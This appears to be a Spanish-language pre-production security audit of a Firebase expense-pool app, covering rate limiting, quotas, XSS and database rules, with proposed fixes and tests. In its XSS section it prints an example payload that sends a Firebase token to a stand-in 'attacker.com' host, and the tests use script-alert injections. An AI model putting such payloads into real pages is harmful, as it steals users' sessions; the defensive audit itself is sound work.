# 🔐 Auditoría de Seguridad - Ant Pool

**Fecha:** 2024  
**Estado:** Pre-Producción  
**Prioridad:** CRÍTICA

---

## 📋 Resumen Ejecutivo

Este documento identifica **vulnerabilidades de seguridad críticas** que deben resolverse antes del lanzamiento a producción, especialmente para prevenir **abuso de costos** y **vectores de ataque comunes**.

### ⚠️ Riesgo Principal: ABUSO DE COSTOS FIREBASE

Firebase Realtime Database cobra por:
- **Operaciones de lectura/escritura** (reads/writes)
- **Almacenamiento** (GB almacenados)
- **Bandwidth** (datos transferidos)

**Escenario de ataque:**
Un usuario malicioso autenticado podría:
1. Crear 1000 grupos en 10 minutos
2. Agregar 100 gastos por segundo a cada grupo
3. Leer todos los grupos repetidamente
4. Generar **miles de dólares en costos** en una sola sesión

**Estado actual:** ❌ SIN PROTECCIÓN

---

## 🚨 VULNERABILIDADES CRÍTICAS

### 1. ❌ SIN RATE LIMITING (Severidad: CRÍTICA)

**Ubicación:** 
- [mode-manager.js](frontend/mode-manager.js#L75-L135) - `createSimpleGroup()`
- [mode-manager.js](frontend/mode-manager.js#L167-L226) - `addSimpleExpense()`
- [mode-manager.js](frontend/mode-manager.js#L764-L820) - `recordSettlement()`

**Problema:**
No hay límite en la cantidad de operaciones que un usuario puede realizar.

**Impacto:**
- Un usuario puede crear **grupos ilimitados**
- Puede agregar **gastos sin restricción**
- Puede generar **miles de operaciones de escritura** en Firebase
- **Costo estimado:** $50-500/día de abuso continuo

**Código vulnerable:**
```javascript
// frontend/mode-manager.js línea 75
async createSimpleGroup(groupInfo) {
    // ❌ NO HAY VALIDACIÓN DE RATE LIMIT
    const groupId = this.generateGroupId();
    await window.FirebaseConfig.writeDb(`groups/${groupId}`, groupData);
    return groupId;
}
```

**Solución requerida:**
```javascript
// ✅ CON RATE LIMITING
async createSimpleGroup(groupInfo) {
    // Verificar límite de creación
    await this.checkRateLimit('createGroup', 5, 3600000); // 5 grupos/hora
    
    const groupId = this.generateGroupId();
    await window.FirebaseConfig.writeDb(`groups/${groupId}`, groupData);
    
    // Registrar acción para rate limiting
    await this.recordAction('createGroup');
    
    return groupId;
}
```

---

### 2. ❌ SIN CUOTAS/LÍMITES DE USO (Severidad: CRÍTICA)

**Problema:**
No hay límites en:
- Cantidad total de grupos por usuario
- Cantidad de gastos por grupo
- Tamaño de descripciones/nombres
- Cantidad de miembros por grupo

**Impacto:**
- Un usuario puede crear **10,000 grupos**
- Grupos con **1,000,000 de gastos** (operaciones de lectura costosas)
- Descripciones de 10 MB (consume storage)

**Solución requerida:**
```javascript
// Límites globales
const LIMITS = {
    MAX_GROUPS_PER_USER: 50,
    MAX_EXPENSES_PER_GROUP: 1000,
    MAX_MEMBERS_PER_GROUP: 50,
    MAX_DESCRIPTION_LENGTH: 500,
    MAX_GROUP_NAME_LENGTH: 100
};
```

---

### 3. ❌ VULNERABILIDAD XSS (Severidad: ALTA)

**Ubicación:** 50+ instancias en:
- [app-platform.js](frontend/app-platform.js) (30+ usos de `.innerHTML`)
- [app.html](frontend/app.html) (15+ usos de `.innerHTML`)
- [app-v2.js](frontend/app-v2.js) (10+ usos)

**Problema:**
Uso extensivo de `.innerHTML` con datos de usuario sin sanitización.

**Código vulnerable encontrado:**
```javascript
// ❌ VULNERABLE - Usuario puede inyectar scripts
fundsGrid.innerHTML = visibleFunds.map(fund => createFundCard(fund)).join('');
invitationItem.innerHTML = `<strong>${groupName}</strong>`; // groupName = "<script>alert('XSS')</script>"
```

**Impacto:**
- **Robo de sesiones** (cookies, tokens de Firebase)
- **Robo de wallets** (solicitudes fraudulentas de firma)
- **Phishing** (UI falsa para robar credenciales)
- **Redirección maliciosa**

**Ejemplo de ataque:**
```javascript
// Usuario crea grupo con nombre:
const maliciousName = `<img src=x onerror="fetch('https://attacker.com/steal?token='+localStorage.getItem('firebase-token'))">;

// Al renderizarse con innerHTML, ejecuta el script
groupCard.innerHTML = `<h3>${maliciousName}</h3>`; // ❌ EJECUTA EL ATAQUE
```

**Solución:**
1. Instalar **DOMPurify** para sanitización
2. Reemplazar `.innerHTML` con `.textContent` donde sea posible
3. Sanitizar TODOS los inputs de usuario antes de renderizar

---

### 4. ❌ DATABASE RULES INSUFICIENTES (Severidad: ALTA)

**Ubicación:** [database.rules.json](database.rules.json)

**Problema actual:**
```json
{
  "rules": {
    "groups": {
      "$groupId": {
        ".read": "auth != null && (data.child('members').child(auth.uid).exists() || data.child('createdBy').val() === auth.uid)",
        ".write": "auth != null && (!data.exists() || data.child('createdBy').val() === auth.uid || data.child('members').child(auth.uid).exists())"
      }
    }
  }
}
```

**Problemas:**
1. ❌ No valida límites de datos
2. ❌ No previene spam de escrituras
3. ❌ No valida estructura de datos
4. ❌ No limita tamaño de arrays/strings

**Impacto:**
- Usuario puede escribir objetos gigantes
- Puede crear estructuras malformadas
- Puede sobreescribir datos críticos

**Solución:**
Agregar validaciones:
```json
{
  "rules": {
    "groups": {
      "$groupId": {
        ".validate": "newData.child('name').isString() && newData.child('name').val().length < 100",
        
        "expenses": {
          ".validate": "newData.numChildren() <= 1000",
          "$expenseId": {
            "description": {
              ".validate": "newData.isString() && newData.val().length <= 500"
            },
            "amount": {
              ".validate": "newData.isNumber() && newData.val() > 0 && newData.val() < 1000000"
            }
          }
        }
      }
    }
  }
}
```

---

### 5. ⚠️ SIN INPUT VALIDATION (Severidad: MEDIA)

**Problema:**
No hay validación exhaustiva de inputs en cliente:

```javascript
// ❌ NO VALIDA
async createSimpleGroup(groupInfo) {
    const groupData = {
        name: groupInfo.name,  // ¿Qué si es 10MB de texto?
        description: groupInfo.description, // ¿Qué si contiene HTML malicioso?
        targetAmount: groupInfo.targetAmount // ¿Qué si es negativo o NaN?
    };
}
```

**Solución:**
```javascript
// ✅ CON VALIDACIÓN
function validateGroupInfo(groupInfo) {
    if (!groupInfo.name || typeof groupInfo.name !== 'string') {
        throw new Error("Nombre inválido");
    }
    if (groupInfo.name.length > 100) {
        throw new Error("Nombre muy largo (max 100 caracteres)");
    }
    if (groupInfo.targetAmount && (groupInfo.targetAmount < 0 || isNaN(groupInfo.targetAmount))) {
        throw new Error("Monto objetivo inválido");
    }
    // Sanitizar HTML
    groupInfo.name = DOMPurify.sanitize(groupInfo.name, {ALLOWED_TAGS: []});
    
    return groupInfo;
}
```

---

## 🛡️ PLAN DE MITIGACIÓN

### Fase 1: CRÍTICO (Implementar YA - 2-3 horas)

#### 1.1. Implementar Rate Limiting Básico

**Archivo:** `frontend/rate-limiter.js` (NUEVO)

```javascript
class RateLimiter {
    constructor() {
        this.actions = {}; // Almacenar en localStorage
        this.loadFromStorage();
    }
    
    /**
     * Verificar si una acción está permitida
     * @param {string} action Nombre de la acción
     * @param {number} maxAttempts Máximo de intentos
     * @param {number} windowMs Ventana de tiempo en ms
     * @returns {boolean} true si está permitido
     */
    async checkLimit(action, maxAttempts, windowMs) {
        const now = Date.now();
        const key = `rateLimit_${action}`;
        
        // Obtener historial de acciones
        let history = this.actions[action] || [];
        
        // Filtrar solo acciones dentro de la ventana de tiempo
        history = history.filter(timestamp => now - timestamp < windowMs);
        
        // Verificar límite
        if (history.length >= maxAttempts) {
            const oldestAction = Math.min(...history);
            const waitTime = Math.ceil((windowMs - (now - oldestAction)) / 1000);
            throw new Error(`Límite excedido. Espera ${waitTime} segundos.`);
        }
        
        return true;
    }
    
    /**
     * Registrar una acción realizada
     */
    async recordAction(action) {
        const now = Date.now();
        
        if (!this.actions[action]) {
            this.actions[action] = [];
        }
        
        this.actions[action].push(now);
        this.saveToStorage();
    }
    
    loadFromStorage() {
        try {
            const data = localStorage.getItem('rateLimitData');
            if (data) {
                this.actions = JSON.parse(data);
            }
        } catch (error) {
            console.error('Error loading rate limit data:', error);
        }
    }
    
    saveToStorage() {
        try {
            localStorage.setItem('rateLimitData', JSON.stringify(this.actions));
        } catch (error) {
            console.error('Error saving rate limit data:', error);
        }
    }
}

// Límites por acción
const RATE_LIMITS = {
    createGroup: { maxAttempts: 5, windowMs: 3600000 }, // 5 grupos/hora
    addExpense: { maxAttempts: 20, windowMs: 60000 },   // 20 gastos/minuto
    recordSettlement: { maxAttempts: 10, windowMs: 60000 }, // 10 pagos/minuto
    inviteMember: { maxAttempts: 10, windowMs: 3600000 }   // 10 invitaciones/hora
};

window.RateLimiter = new RateLimiter();
```

#### 1.2. Agregar Rate Limiting a mode-manager.js

**Modificaciones necesarias:**

```javascript
// En createSimpleGroup (línea 75)
async createSimpleGroup(groupInfo) {
    // ✅ AGREGAR RATE LIMITING
    const limit = RATE_LIMITS.createGroup;
    await window.RateLimiter.checkLimit('createGroup', limit.maxAttempts, limit.windowMs);
    
    // ... código existente ...
    
    await window.FirebaseConfig.writeDb(`groups/${groupId}`, groupData);
    
    // ✅ REGISTRAR ACCIÓN
    await window.RateLimiter.recordAction('createGroup');
    
    return groupId;
}

// En addSimpleExpense (línea 167)
async addSimpleExpense(expenseInfo) {
    // ✅ AGREGAR RATE LIMITING
    const limit = RATE_LIMITS.addExpense;
    await window.RateLimiter.checkLimit('addExpense', limit.maxAttempts, limit.windowMs);
    
    // ... código existente ...
    
    await window.FirebaseConfig.writeDb(`groups/${this.currentGroupId}/expenses/${expenseId}`, expense);
    
    // ✅ REGISTRAR ACCIÓN
    await window.RateLimiter.recordAction('addExpense');
    
    return expenseId;
}
```

#### 1.3. Actualizar database.rules.json con Validaciones

**Archivo:** `database.rules.json`

```json
{
  "rules": {
    "groups": {
      "$groupId": {
        ".read": "auth != null && (data.child('members').child(auth.uid).exists() || data.child('createdBy').val() === auth.uid)",
        ".write": "auth != null && (!data.exists() || data.child('createdBy').val() === auth.uid || data.child('members').child(auth.uid).exists())",
        
        ".validate": "newData.hasChildren(['id', 'name', 'createdBy', 'createdAt']) && newData.child('name').isString() && newData.child('name').val().length > 0 && newData.child('name').val().length <= 100",
        
        "name": {
          ".validate": "newData.isString() && newData.val().length > 0 && newData.val().length <= 100"
        },
        
        "description": {
          ".validate": "newData.isString() && newData.val().length <= 500"
        },
        
        "targetAmount": {
          ".validate": "newData.isNumber() && newData.val() >= 0 && newData.val() <= 10000000"
        },
        
        "expenses": {
          ".validate": "newData.numChildren() <= 1000",
          
          "$expenseId": {
            ".write": "auth != null && root.child('groups').child($groupId).child('members').child(auth.uid).exists()",
            
            "description": {
              ".validate": "newData.isString() && newData.val().length > 0 && newData.val().length <= 500"
            },
            
            "amount": {
              ".validate": "newData.isNumber() && newData.val() > 0 && newData.val() <= 1000000"
            }
          }
        },
        
        "members": {
          ".validate": "newData.numChildren() >= 1 && newData.numChildren() <= 50"
        },
        
        "settlements": {
          ".validate": "newData.numChildren() <= 500",
          
          "$settlementId": {
            ".write": "auth != null && root.child('groups').child($groupId).child('members').child(auth.uid).exists()",
            
            "amount": {
              ".validate": "newData.isNumber() && newData.val() > 0 && newData.val() <= 1000000"
            }
          }
        }
      }
    },
    
    "users": {
      "$userId": {
        ".read": "auth != null && auth.uid === $userId",
        ".write": "auth != null && auth.uid === $userId",
        
        "groups": {
          ".validate": "newData.numChildren() <= 50"
        }
      }
    }
  }
}
```

---

### Fase 2: ALTA PRIORIDAD (1-2 días)

#### 2.1. Implementar DOMPurify para XSS Protection

**Instalar DOMPurify:**

```html
<!-- En app.html, app-v2.html, index.html -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
```

**Crear utilidad de sanitización:**

```javascript
// frontend/sanitizer.js (NUEVO)
const Sanitizer = {
    /**
     * Sanitizar texto HTML
     */
    sanitizeHTML(dirty) {
        return DOMPurify.sanitize(dirty, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
            ALLOWED_ATTR: []
        });
    },
    
    /**
     * Sanitizar texto plano (sin HTML)
     */
    sanitizeText(dirty) {
        return DOMPurify.sanitize(dirty, {ALLOWED_TAGS: []});
    },
    
    /**
     * Sanitizar URL
     */
    sanitizeURL(url) {
        try {
            const parsed = new URL(url);
            if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
                return url;
            }
        } catch (e) {
            return '';
        }
        return '';
    }
};

window.Sanitizer = Sanitizer;
```

**Reemplazar .innerHTML críticos:**

```javascript
// ❌ ANTES (vulnerable)
fundsGrid.innerHTML = visibleFunds.map(fund => createFundCard(fund)).join('');

// ✅ DESPUÉS (seguro)
fundsGrid.innerHTML = DOMPurify.sanitize(
    visibleFunds.map(fund => createFundCard(fund)).join('')
);

// O mejor aún, usar textContent:
const fundName = document.createElement('h3');
fundName.textContent = fund.name; // No ejecuta scripts
```

#### 2.2. Agregar Input Validation

**Archivo:** `frontend/validators.js` (NUEVO)

```javascript
const Validators = {
    validateGroupInfo(groupInfo) {
        const errors = [];
        
        // Nombre
        if (!groupInfo.name || typeof groupInfo.name !== 'string') {
            errors.push("Nombre de grupo requerido");
        } else if (groupInfo.name.length > 100) {
            errors.push("Nombre muy largo (máximo 100 caracteres)");
        }
        
        // Descripción
        if (groupInfo.description && groupInfo.description.length > 500) {
            errors.push("Descripción muy larga (máximo 500 caracteres)");
        }
        
        // Monto objetivo
        if (groupInfo.targetAmount !== undefined) {
            const amount = parseFloat(groupInfo.targetAmount);
            if (isNaN(amount) || amount < 0 || amount > 10000000) {
                errors.push("Monto objetivo inválido");
            }
        }
        
        if (errors.length > 0) {
            throw new Error(errors.join(', '));
        }
        
        // Sanitizar
        return {
            ...groupInfo,
            name: window.Sanitizer.sanitizeText(groupInfo.name),
            description: window.Sanitizer.sanitizeText(groupInfo.description || '')
        };
    },
    
    validateExpenseInfo(expenseInfo) {
        const errors = [];
        
        if (!expenseInfo.description || expenseInfo.description.length === 0) {
            errors.push("Descripción requerida");
        } else if (expenseInfo.description.length > 500) {
            errors.push("Descripción muy larga");
        }
        
        const amount = parseFloat(expenseInfo.amount);
        if (isNaN(amount) || amount <= 0 || amount > 1000000) {
            errors.push("Monto inválido");
        }
        
        if (errors.length > 0) {
            throw new Error(errors.join(', '));
        }
        
        return {
            ...expenseInfo,
            description: window.Sanitizer.sanitizeText(expenseInfo.description),
            amount: amount
        };
    }
};

window.Validators = Validators;
```

---

### Fase 3: RECOMENDADO (Después del lanzamiento)

#### 3.1. Firebase Functions para Rate Limiting Server-Side

Implementar Cloud Functions que validen operaciones:

```javascript
// functions/index.js
exports.validateGroupCreation = functions.database
    .ref('/groups/{groupId}')
    .onCreate(async (snapshot, context) => {
        const group = snapshot.val();
        const userId = group.createdBy;
        
        // Contar grupos del usuario
        const userGroupsSnapshot = await admin.database()
            .ref(`users/${userId}/groups`)
            .once('value');
        
        const groupCount = userGroupsSnapshot.numChildren();
        
        // Si excede límite, eliminar grupo
        if (groupCount > 50) {
            await snapshot.ref.remove();
            console.log(`Grupo eliminado: Usuario ${userId} excedió límite`);
        }
    });
```

#### 3.2. Monitoreo y Alertas

Configurar alertas de Firebase:

1. **Budget Alerts:** Firebase Console → Billing → Set budget
2. **Usage Monitoring:** Configurar alertas en $10, $25, $50, $100
3. **Analytics:** Trackear operaciones sospechosas

---

## 📊 COSTO ESTIMADO DE NO IMPLEMENTAR

### Escenario de Ataque Realista

**Ataque moderado (1 usuario malicioso, 1 hora):**
- 100 grupos creados: 100 writes
- 50 gastos por grupo: 5,000 writes
- 10 lecturas de todos los grupos/segundo: 36,000 reads
- **Total:** 41,100 operaciones

**Costo estimado:** $0.20 - $2.00/hora

**Ataque sostenido (24 horas):**
- **Total:** ~986,400 operaciones
- **Costo estimado:** $5 - $50/día

**Ataque coordinado (10 usuarios, 1 semana):**
- **Costo estimado:** $350 - $3,500/semana

---

## ✅ CHECKLIST DE IMPLEMENTACIÓN

### Crítico (Antes de producción)
- [ ] Implementar RateLimiter class
- [ ] Agregar rate limiting a createSimpleGroup
- [ ] Agregar rate limiting a addSimpleExpense
- [ ] Agregar rate limiting a recordSettlement
- [ ] Actualizar database.rules.json con validaciones
- [ ] Desplegar reglas: `firebase deploy --only database`
- [ ] Probar límites funcionan correctamente

### Alta Prioridad (Semana 1)
- [ ] Instalar DOMPurify
- [ ] Crear Sanitizer utility
- [ ] Reemplazar .innerHTML críticos (mínimo 20 instancias)
- [ ] Crear Validators utility
- [ ] Agregar validación a createSimpleGroup
- [ ] Agregar validación a addSimpleExpense
- [ ] Testing de XSS

### Recomendado (Semana 2-4)
- [ ] Implementar Firebase Functions
- [ ] Configurar budget alerts
- [ ] Implementar logging de operaciones sospechosas
- [ ] Dashboard de monitoreo
- [ ] Documentar límites para usuarios

---

## 🧪 TESTING DE SEGURIDAD

### Test 1: Rate Limiting
```javascript
// Intentar crear 10 grupos seguidos
for (let i = 0; i < 10; i++) {
    await modeManager.createSimpleGroup({name: `Test ${i}`});
}
// Esperado: Falla después de 5 con error "Límite excedido"
```

### Test 2: XSS Protection
```javascript
// Crear grupo con nombre malicioso
await modeManager.createSimpleGroup({
    name: `<script>alert('XSS')</script>`
});
// Esperado: Script sanitizado, no se ejecuta
```

### Test 3: Database Rules
```javascript
// Intentar crear gasto con monto negativo
await modeManager.addSimpleExpense({
    description: "Test",
    amount: -100
});
// Esperado: Firebase rechaza con "Permission denied"
```

---

## 📞 CONTACTO DE EMERGENCIA

Si detectas un ataque en producción:

1. **Firebase Console:** Pausar operaciones sospechosas
2. **Database Rules:** Temporalmente hacer read-only
3. **Revisar logs:** Identificar usuario atacante
4. **Bloquear usuario:** Firebase Auth → Disable user
5. **Revisar costos:** Billing → Check usage spike

---

**Autor:** GitHub Copilot  
**Última actualización:** 2024  
**Estado:** DRAFT - Requiere implementación inmediata
